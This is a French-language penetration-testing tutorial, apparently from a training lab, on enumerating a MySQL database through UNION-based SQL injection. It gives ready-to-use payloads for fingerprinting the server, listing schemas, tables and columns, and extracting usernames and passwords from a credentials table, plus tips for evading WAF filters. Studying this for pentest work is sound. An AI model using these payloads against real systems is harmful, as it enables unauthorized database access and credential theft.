# Enumeration de la base de donnees

## Pourquoi

Une fois l'injection UNION confirmee, l'objectif est d'extraire un maximum de donnees du SGBD. Mais pour cela, il faut savoir quelles bases existent, quelles tables elles contiennent, et quelles colonnes composent ces tables. Toutes ces informations sont stockees dans la base `INFORMATION_SCHEMA`, accessible en lecture par defaut.

## Comment ca marche

### Fingerprinting du SGBD

Avant d'enumerer, confirmer le type de SGBD. Chaque SGBD a ses propres fonctions et particularites :

| Payload | Si MySQL/MariaDB | Si autre SGBD |
|---|---|---|
| `SELECT @@version` | Retourne la version MySQL | MSSQL retourne sa version, autres donnent une erreur |
| `SELECT POW(1,1)` | Retourne `1` | Erreur avec PostgreSQL |
| `SELECT SLEEP(5)` | Delai de 5 secondes | Pas de delai avec les autres |

### La base INFORMATION_SCHEMA

`INFORMATION_SCHEMA` est une base de metadonnees presente dans tous les SGBD SQL. Elle contient des informations sur toutes les bases, tables et colonnes du serveur. Les trois tables cles :

| Table | Contenu | Colonnes utiles |
|---|---|---|
| `SCHEMATA` | Liste des bases de donnees | `SCHEMA_NAME` |
| `TABLES` | Liste des tables de toutes les bases | `TABLE_NAME`, `TABLE_SCHEMA` |
| `COLUMNS` | Liste des colonnes de toutes les tables | `COLUMN_NAME`, `TABLE_NAME`, `TABLE_SCHEMA` |

{% hint style="info" %}
Les bases `mysql`, `information_schema`, `performance_schema` et `sys` sont des bases systeme presentes sur tous les serveurs MySQL. Elles sont generalement ignorees lors de l'enumeration, sauf si on cherche des privileges ou des informations de configuration.
{% endhint %}

## En pratique

### Etape 1 : Lister les bases de donnees

```sql
cn' UNION SELECT 1,SCHEMA_NAME,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

Resultat typique : les bases systeme plus les bases applicatives (ex: `ilfreight`, `dev`).

### Etape 2 : Identifier la base courante

```sql
cn' UNION SELECT 1,database(),3,4-- -
```

Retourne le nom de la base utilisee par l'application (ex: `ilfreight`).

### Etape 3 : Lister les tables d'une base

```sql
cn' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dev'-- -
```

Le filtre `WHERE TABLE_SCHEMA='dev'` limite les resultats a la base `dev`. Sans ce filtre, on obtient les tables de toutes les bases, ce qui peut etre volumineux.

### Etape 4 : Lister les colonnes d'une table

```sql
cn' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='credentials'-- -
```

### Etape 5 : Extraire les donnees

Une fois les noms de colonnes connus, extraire les donnees avec une requete directe. Utiliser la notation `base.table` si on cible une base differente de la base courante :

```sql
cn' UNION SELECT 1,username,password,4 FROM dev.credentials-- -
```

### Chaine complete d'enumeration

```sql
-- 1. Bases de donnees
' UNION SELECT 1,SCHEMA_NAME,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -

-- 2. Base courante
' UNION SELECT 1,database(),3,4-- -

-- 3. Tables de la base 'dev'
' UNION SELECT 1,TABLE_NAME,3,4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dev'-- -

-- 4. Colonnes de la table 'credentials'
' UNION SELECT 1,COLUMN_NAME,3,4 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='credentials'-- -

-- 5. Donnees
' UNION SELECT 1,username,password,4 FROM dev.credentials-- -
```

## Pieges et galeres

- La notation `base.table` est obligatoire quand on cible une table dans une base differente de la base courante. Oublier le prefixe produit une erreur `Table doesn't exist`.
- `INFORMATION_SCHEMA` est sensible a la casse sur certains SGBD. En MySQL, les noms de tables dans `INFORMATION_SCHEMA` sont en majuscules (`SCHEMATA`, `TABLES`, `COLUMNS`), mais la reference a la base elle-meme n'est pas sensible a la casse.
- Si l'application n'affiche qu'une seule ligne de resultat, utiliser `GROUP_CONCAT()` pour agreger tous les resultats en une seule chaine : `GROUP_CONCAT(TABLE_NAME SEPARATOR ', ')`.
- Certains WAF filtrent `INFORMATION_SCHEMA`. Des alternatives existent : `mysql.innodb_table_stats` (MySQL 5.7+) contient les noms de tables sans passer par `INFORMATION_SCHEMA`.

## Retour terrain

L'enumeration via `INFORMATION_SCHEMA` est la methodologie standard pour exploiter une SQLi UNION-based. En engagement, l'objectif est d'arriver le plus vite possible aux tables contenant des donnees sensibles (credentials, donnees personnelles, tokens API). La chaine SCHEMATA -> TABLES -> COLUMNS -> donnees est systematique et reproductible.

Documenter chaque requete et son resultat dans les notes. Ces informations alimentent directement la section "preuves d'exploitation" du rapport de pentest.

## Memo express

| Objectif | Requete |
|---|---|
| Lister les bases | `SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA` |
| Base courante | `SELECT database()` |
| Tables d'une base | `SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='base'` |
| Colonnes d'une table | `SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='table'` |
| Donnees | `SELECT col1, col2 FROM base.table` |
| Agreger en une ligne | `SELECT GROUP_CONCAT(col SEPARATOR ', ') FROM table` |
| Notation cross-database | `base.table` |

***
